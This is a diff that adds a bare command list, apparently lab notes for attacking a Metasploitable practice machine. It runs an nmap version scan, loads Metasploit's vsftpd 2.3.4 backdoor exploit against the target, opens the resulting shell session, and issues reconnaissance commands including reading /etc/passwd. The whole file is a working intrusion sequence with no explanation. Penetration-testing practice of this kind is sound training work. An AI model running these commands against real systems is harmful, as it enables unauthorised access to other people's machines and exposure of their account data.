@@ -1,0 +1,17 @@
+nmap -sV -A meta-ip
+msfconsole
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOST meta-ip
+exploit
+
+
+background
+options
+sessions -i 1
+
+ls
+pwd
+cat /etc/passwd
+ifconfig
+hostname
